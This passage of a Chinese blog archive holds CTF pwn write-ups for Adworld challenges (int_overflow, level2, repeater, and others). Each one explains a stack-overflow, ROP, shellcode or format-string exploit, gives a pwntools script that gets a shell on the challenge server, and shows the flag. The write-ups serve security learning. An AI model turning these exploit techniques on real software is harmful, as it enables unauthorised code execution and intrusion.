operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">52125</span><span class="token punctuation">)</span>   <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callsystem_addr<span class="token punctuation">)</span>    <span class="token comment"># 这里不用callsystem_addr直接用0x0400596也是可以的</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{4fe5a9ae3ea3933da95ede70cc81c13a}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/uybAwWYmaGoFg48.png" alt="攻防世界-level0 8.png"></p><p>只出现了 <code>[*] Switching to interactive mode</code>，而没有 <code>[*] Got EOF while reading in interactive</code>，说明已经 PWN 通，得到 flag</p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-int_overflow</title>
      <link href="/2023/034abd80e1.html"/>
      <url>/2023/034abd80e1.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>原输入的栈无法溢出，通过 strcpy 复制操作进行溢出</mark></p></li><li><p><mark>注意参数的类型</mark>，例如 <code>unsigned __int8 v3</code>，<code>v3 = strlen(s)</code>，<code>v3</code> 是一个 <em>8位 int型</em> 数据，即使 <code>s</code> 的长度为 0x104，<code>v3</code> 也只能为 0x04（<strong>1字节 只能存放 2位 十六进制数</strong>）</p></li><li><p><mark>通过 <code>payload.ljust(0x104, b&#39;a&#39;)</code> 可以直接往 payload 后面添加 b’a’ 一直填充至指定长度 0x104</mark> 【<code>ljust()</code> 的 <code>l</code> 是让 payload 左对齐，往右侧添加字符，<em><strong>一直将原字符串填充到指定长度，而不是填充多少个字符</strong></em>】</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/51ed19eacdea43e3bd67217d08eb8a0e">攻防世界-int_overflow</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/drYtSVfjPwXx3T6.png" alt="攻防世界-int_overflow1.png"><br>32 位 小端序，只开启了栈不可执行</p></li><li><p>尝试执行：<br><img src="https://s2.loli.net/2023/03/18/fPMJn9FpQDl1NyB.png" alt="攻防世界-int_overflow2.png"></p></li><li><p>在 IDA 中分析：<br><img src="https://s2.loli.net/2023/03/18/pIw5qkU8mLo2SX9.png" alt="攻防世界-int_overflow3.png"><br>跟进 <code>login()</code>：<br><img src="https://s2.loli.net/2023/03/18/VuO4KhDoc1Yvd7T.png" alt="攻防世界-int_overflow4.png"><br>有两个输入，查看数据 <code>s</code> 和 <code>buf</code> 在栈中的位置：<br><img src="https://s2.loli.net/2023/03/18/YPUgnO5AR9dwZ1I.png" alt="攻防世界-int_overflow5.png"><br><img src="https://s2.loli.net/2023/03/18/4R5iwPAVaHxJEZb.png" alt="攻防世界-int_overflow6.png"><br><code>s</code> 在栈中的长度为 <code>0x28</code>，而输入的 <code>s</code> 长度为 <code>0x19</code>；<code>buf</code> 在栈中的长度为 <code>0x200</code>，而输入的 <code>buf</code> 长度为 <code>0x199</code><br>因此无法通过输入来进行溢出操作</p></li><li><p>跟进函数 <code>check_passwd(buf)</code>：<br><img src="https://s2.loli.net/2023/03/18/wMYsh723XxcCJrO.png" alt="攻防世界-int_overflow7.png"><br>首先控制了 <code>v3</code> 长度要在 <code>4~8</code> 之间，然后将 <code>形参s</code>【其实就是 <code>login()</code> 中的 <code>buf</code>】中存放的内容复制到 <code>dest</code> 中：<br><img src="https://s2.loli.net/2023/03/18/dnvm2OG4NRVEi7u.png" alt="攻防世界-int_overflow8.png"><br><mark>注意：这里的 <code>v3 = strlen(s)</code> 得到的并不是 <code>形参s</code> 的长度，因为 <code>v3</code> 的定义为 <code>unsigned __int8 v3</code>，即 <code>v3</code> 是一个 <em><strong>无符号的 8位 int型 数据</strong></em>，也就是 <em><strong>1字节</strong></em>，<strong>只能存放两位十六进制数，即：当 buf 的长度为 261（0x105） 时，v3 &#x3D;&#x3D; 0x05</strong></mark></p></li><li><p>在 IDA 左侧函数列表中，注意到一个后门函数：<br><img src="https://s2.loli.net/2023/03/18/14Uq37epKOHwaM9.png" alt="攻防世界-int_overflow9.png"><br>肯定是需要修改函数返回值转而执行这个 <code>what_is_this()</code> 函数</p></li><li><p>发现在函数 <code>check_passwd(buf)</code> 中进行 <code>strcpy(dest, s)</code> 的复制操作时，虽然之前输入时 <code>buf</code> 无法进行溢出操作，但是通过 <code>strcpy()</code> 复制，可以利用 <code>buf</code> 将 <code>dest</code> 溢出，然后覆盖掉 <code>dest</code> 所在的栈中的返回值，这样就可以实现跳转了</p></li><li><p>但是想要执行复制操作，就必须先满足 <code>v3 &gt; 3u &amp;&amp; v3 &lt;= 8u</code> 的条件，即 <code>v3</code> 可以取值的范围是 <code>4~8</code>，也就是 <code>0x04~0x08</code><br>结合 <code>v3 = strlen(s)</code> 且输入的 <code>buf</code> 长度为 <code>0x199</code><br>可以得出满足条件的 <code>buf</code> 的长度应该为：<code>0x104~0x108</code></p></li><li><p>于是<strong>思路</strong>就很清晰了：<br> ① 首先输入 <code>&quot;1&quot;</code> 选择登录<br> ② 由于 <code>login()</code> 中的 <code>s</code> 没有溢出点，在长度为 <code>0x28</code> 以内随便输入即可<br> ③ 由于 <code>login()</code> 中的 <code>buf</code> 在原本的栈中无法溢出，但是 <code>buf</code> 的值会复制到 <code>dest</code> 中，<code>dest</code> 是可以溢出的。根据 <code>dest</code> 所在的栈，要覆盖返回值需要先填充 <code>0x14 - 0x00 + 0x04</code> 个垃圾数据，然后加上 <code>what_is_this()</code> 函数的地址，函数的地址可以通过 <code>elf.symbols[&quot;what_is_this&quot;]</code> 获得<br> ④ 这样就保证了当 <code>buf</code> 的值复制到 <code>dest</code> 后，会转而执行后门函数 <code>what_is_this()</code><br> ⑤ 但是，想要让复制操作执行，首先需要通过前面的 <code>if ( v3 &lt;= 3u || v3 &gt; 8u )</code> 语句，即：让 <code>v3 = strlen(s)</code> 的长度保持在 <code>0x04~0x08</code>，也就是 <code>buf</code> 的长度要保持在 <code>0x104~0x108</code><br> ⑥ 因此，除去前面为 <code>buf</code> 构造 <code>payload</code> 所用的 <code>b&#39;a&#39; * (0x14 - 0x00 + 0x04) + p32(elf.symbols[&quot;what_is_this&quot;])</code> 以外，还要在后面继续填充垃圾字符，让 <code>buf</code> 的长度在 <code>0x104~0x108</code> 之间<br> ⑦ 通过 <code>payload.ljust(0x104, b&#39;a&#39;)</code> 即可实现在 <code>payload</code> 右边添加 <code>b&#39;a&#39;</code> 一直将 <code>payload</code> 的长度填充至 <code>0x104</code></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./int_overflow"</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"what_is_this"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./int_overflow"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">56322</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x14</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment"># 溢出dest，使其跳转至what_is_this函数</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x104</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>  <span class="token comment"># 原payload左对齐，往payload右侧填充b'a'，一直填充到payload的长度为0x104</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your username:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"999"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your passwd:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{25686bc91ab84046b5a18aaa66041868}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/Lpc7h6CUlbRSDkx.png" alt="攻防世界-int_overflow10.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-level2</title>
      <link href="/2023/03422cd701.html"/>
      <url>/2023/03422cd701.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>通过构造 ROP 链，<mark>利用 PLT 表找到 system() 函数的地址，执行 system() 函数</mark></p></li><li><p></mark>给 system() 函数构造参数，注意提供函数返回值，<em>保持栈的平衡，需要填充 4个 垃圾数据</em></mark></p></li><li><p>熟悉<mark>使用 exp 获取地址的方法，例如函数的地址、字符串的地址等</mark>；以及<mark>通过 IDA 查看地址的方法</mark>，<em><strong>通过 exp 获取的地址和 IDA 中直接查看的地址是一样的</strong></em></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/1ab77c073b4f4524b73e086d063f884e">攻防世界-level2</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/hEpF2m5NqtScRDi.png" alt="攻防世界-level2 1.png"><br>32位 小端序，只开启了栈不可执行</p></li><li><p>尝试执行文件：<br><img src="https://s2.loli.net/2023/03/18/gpY9qAnSjwkt7Ur.png" alt="攻防世界-level2 2.png"></p></li><li><p>在 IDA 分析：<br><img src="https://s2.loli.net/2023/03/18/9Q7spCbyUetDFmI.png" alt="攻防世界-level2 3.png"><br>跟进 <code>vulnerable_function()</code>：<br><img src="https://s2.loli.net/2023/03/18/1nldbCxPvzSjkVL.png" alt="攻防世界-level2 4.png"><br>通过 <code>read()</code> 向 <code>buf</code> 写入长度为 0x100 的数据，但是栈中 <code>buf</code> 的长度只有 0x88，可以栈溢出<br>但是没有发现其他执行类似 <code>system(&quot;/bin/sh&quot;)</code> 命令的函数</p></li><li><p>查看字符串发现 “<code>/bin/sh</code>“：<br><img src="https://s2.loli.net/2023/03/18/1WQAi4stcqrj39p.png" alt="攻防世界-level2 5.png"><br><img src="https://s2.loli.net/2023/03/18/hpTQ9quP8twWkcl.png" alt="攻防世界-level2 6.png"><br>只要想办法执行这里的 “<code>/bin/sh</code>“ 即可</p></li><li><p>由于这里给出了 <code>system()</code> 函数，可以利用这个函数执行 sysytem 的命令<br><img src="https://s2.loli.net/2023/03/18/KTeMBRqjnogI7GO.png" alt="攻防世界-level2 7.png"><br>如果将 <code>/bin/sh</code> 作为参数 <code>command</code> 传入 <code>system()</code> 函数，就可以 PWN 掉主机</p></li><li><p>所以<strong>思路</strong>如下：<br> ① 首先需要通过 <code>PLT</code>、<code>GOT</code> 表找到 <code>system()</code> 函数的地址；<br> ② 通过栈溢出实现函数跳转，让程序执行 <code>system()</code> 函数；<br> ③ 再找到 <code>/bin/sh</code> 的地址；<br> ④ 利用 <code>system()</code> 函数将 <code>/bin/sh</code> 执行，就可以实现 PWN 操作</p></li><li><p>查看输入的 buf 在栈中的位置：<br><img src="https://s2.loli.net/2023/03/18/FLMR643pljAaQb1.png" alt="攻防世界-level2 8.png"><br>首先填充 <code>b&#39;a&#39; * (0x88 - 0x00 + 0x04)</code> 个字符，然后接上 <code>system()</code> 函数的地址作为返回值，使程序转而执行 <code>system()</code> 函数</p></li><li><p><mark>至于 <code>system()</code> 函数的地址，可以根据 <code>system_plt_addr = elf.plt[&quot;system&quot;]</code> 从 PLT 表中获取<br>另外，在 IDA 中，直接搜索函数 “system”，可以看到 <code>.plt</code> 段的函数 <code>.system</code> 的地址为 <code>0x08048320</code></mark><br><img src="https://s2.loli.net/2023/03/18/CoumXVFiG6aqeQD.png" alt="攻防世界-level2 9.png"></p></li><li><p><mark>接下来就是给 <code>system()</code> 函数提供参数 <code>/bin/sh</code><br>可以通过 <code>bin_sh_addr = next(elf.search(b&quot;/bin/sh&quot;))</code> 在程序中搜索 <code>/bin/sh</code> 的地址<br>也可以直接在 IDA 中，看到字符串 <code>/bin/sh</code> 的地址为 <code>0x0804A024</code></mark><br><img src="https://s2.loli.net/2023/03/18/tPZeHw4yh8gQGds.png" alt="攻防世界-level2 10.png"></p></li><li><p>注意这里需要用 4 个字节作为 <code>system(&quot;/bin/sh&quot;)</code> 的返回地址，使栈保持平衡</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>   <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>   <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level2"</span><span class="token punctuation">)</span>     <span class="token comment"># 生成对象elf</span>system_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>     <span class="token comment"># 根据plt表获取system的地址，根据ida可知.plt段指向的.system的地址为0x08048320</span>bin_sh_addr <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment"># 在程序中搜寻/bin/sh的地址，根据ida可知地址为0x0804A024</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./level2"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">56085</span><span class="token punctuation">)</span>   <span class="token comment"># 题目的远程端口，注意是remote</span>        payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_plt_addr<span class="token punctuation">)</span>    <span class="token comment"># 跳转到system函数的地址，system_plt_addr直接写0x08048320也可以</span>    payload <span class="token operator">=</span> payload <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>  <span class="token comment"># 填入4个垃圾字符作为返回地址，保持栈平衡，bin_sh_addr直接填0x0804A024也可以</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{437e920e2e285d2484407590036a7d62}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/PYD7Tmt6szAnwBS.png" alt="攻防世界-level2 11.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-repeater</title>
      <link href="/2023/03dfe140bc.html"/>
      <url>/2023/03dfe140bc.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>IDA 中看到的地址是偏移地址</mark>，当开启了 <code>PIE</code> 地址随机化时，<strong>真实地址 &#x3D; 程序的基地址 + 偏移地址</strong></p></li><li><p><mark>可以直接向 <code>.bss</code> 段上写入 <code>shellcode</code>，再通过栈溢出去执行段上的 <code>shellcode</code></mark></p></li><li><p><mark>开启 <code>PIE</code> 地址随机化后，程序执行过程中打印的地址就是真实的地址</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/ad96eacb-7944-4e2c-a5f1-0e9255c06639.zip">攻防世界-repeater</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/BaefzdI4ZDSKsp5.png" alt="攻防世界-repeater1.png"><br>64位 小端序，开启了 <code>PIE</code> 地址随机化</p></li><li><p>尝试运行：<br><img src="https://s2.loli.net/2023/03/18/dyNSQawDI7XZ24M.png" alt="攻防世界-repeater2.png"><br>存在溢出</p></li><li><p>在 IDA 下分析：<br><img src="https://s2.loli.net/2023/03/18/OtkR17GcAL4hyij.png" alt="攻防世界-repeater3.png"><br>首先通过 <code>memset()</code> 函数将 <code>byte_202040</code> 的地址初始化，然后通过 <code>sub_982()</code> 函数将用户输入写到 <code>byte_202040</code> 地址处</p></li><li><p>查看 <code>byte_202040</code> 地址的位置：<br><img src="https://s2.loli.net/2023/03/18/RaJQh8zT1CUK2mn.png" alt="攻防世界-repeater4.png"><br>发现 <code>byte_202040</code> 是存储到 <code>.bss</code> 段上的<br>由于这个题的函数列表中没有给出 <code>system()</code> 函数，因此在 <code>.bss</code> 段上写入 <code>&quot;/bin/sh&quot;</code> 再通过 <code>system()</code> 函数来调用执行的方法是不行了；不过可以考虑在 <code>.bss</code> 段上写入 <code>shellcode</code>，让程序跳转到这里来执行 <code>shellcode</code></p></li><li><p>但是这个题<mark>开启了 <code>PIE</code> 地址随机化，因此在 IDA 中看到的地址并不是程序中真实的地址，而是偏移地址</mark><br>所以即使将 <code>shellcode</code> 写入到 <code>0x202040</code> 的地址上，也并不知道 <code>shellcode</code> 在程序中存放的真实地址，需要先确定程序的基地址，就可以通过 <em><strong>真实地址 &#x3D; 基地址 + 偏移地址</strong></em> 计算出来</p></li><li><p>观察到 for 循环中会打印出 <code>main()</code> 函数的地址【<strong>这个是函数在程序中的真实地址</strong>】<br><img src="https://s2.loli.net/2023/03/18/q5XoUvG4Rn1ibft.png" alt="攻防世界-repeater5.png"><br>但是打印 <code>main()</code> 函数的地址需要 <code>v5 == 3281697</code>，而程序中定义的是 <code>v5 = 1192227</code><br>注意到还有一个 <code>read()</code> 函数进行输入，将输入存储到 <code>s</code> 中，输入的长度为 <code>0x40</code><br>查看 <code>s</code> 所在的位置：<br><img src="https://s2.loli.net/2023/03/18/5LDMEoGv9suJgba.png" alt="攻防世界-repeater6.png"><br>由于 <code>read()</code> 输入的长度是 <code>0x40</code>，而 <code>s</code> 在栈中的长度是 <code>0x20</code>，因此是可以溢出的</p></li><li><p>接下来思路就很明确了：<br> ① 在输入 <code>name</code> 的时候，由于是存储到 <code>.bss</code> 段上的，在这里写入一个 <code>shellcode</code><br> ② 然后，通过 <code>read()</code> 函数进行栈溢出，一直覆盖到 <code>v5</code> 的位置，并将 <code>v5</code> 的值修改为 <code>3281697</code><br> ③ 然后程序就会打印出 <code>main()</code> 函数的真实地址，将这个地址记录下来<br> ④ 在 IDA 中找到 <code>main()</code> 函数的偏移地址，用 <code>main()</code> 函数的 <strong>真实地址 - 偏移地址 &#x3D; 程序的基地址</strong><br> ⑤ 在 IDA 中找到 <code>shellcode</code> 存放的偏移地址，用 <code>shellcode</code> 的 <strong>偏移地址 + 程序的基地址 &#x3D; 真实地址</strong><br> ⑥ 再次通过 <code>read()</code> 函数进行栈溢出，一直覆盖到函数返回的地方，将返回值修改为 <code>shellcode</code> 的真实地址<br> ⑦ 程序跳转到 <code>shellcod</code>e 的地址去执行 <code>shellcode</code>，获得 shell</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./repeater"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">64526</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 构造shellcode</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please give me your name :\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>  <span class="token comment"># name存储在.bss段上，通过这里的输入向.bss段上写入shellcode</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3281697</span><span class="token punctuation">)</span>  <span class="token comment"># 栈溢出修改v5的值为3281697</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"But there is gift for you :\n"</span><span class="token punctuation">)</span>    main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 保存下程序打印出的main()的真实地址</span>    base_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> <span class="token number">0x0A33</span>  <span class="token comment"># 利用main()的真实地址计算出程序的基地址，0x0A33是main()的偏移地址，可以在ida中查看</span>    shellcode_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> <span class="token number">0x202040</span>  <span class="token comment"># 利用程序的基地址和写入的shellcode在.bss段上的偏移地址，计算出shellcode存放的真实地址</span>    <span class="token comment"># 0x202040是byte_202040在.bss段上的偏移地址，可以在ida中查看 </span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>  <span class="token comment"># 再次通过栈溢出让程序跳转到shellcode的位置去执行</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{7165ca68103868530e16b6038318afc5}</p></blockquote><p><img src="https://s2.loli.net/2023/03/19/ULo3sIZnerVEMtG.png" alt="攻防世界-repeater7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-string</title>
      <link href="/2023/03426370b7.html"/>
      <url>/2023/03426370b7.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>格式化字符串漏洞</mark><br>  例如：通过 <code>printf(&quot;%p__%p__%p__&quot;)</code> 打印出栈中的数据，从而判断输入的数据在栈中的位置，假如已知在栈上第 7 位，然后再通过 <code>printf(&quot;%85d%7$n&quot;)</code> 来将 第7个参数 修改为 85</p></li><li><p><mark><code>mmap()</code> 函数可以将输入的数据作为函数来执行</mark>。可以通过写入 <code>Pwntools</code> 生成的默认 <code>shellcode</code> 来执行，等价于执行了 <code>system(&quot;/bin/sh&quot;)</code>，例如：</p></li></ul><pre class="language-c" data-language="c"><code class="language-c">v1 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><hr><p><a 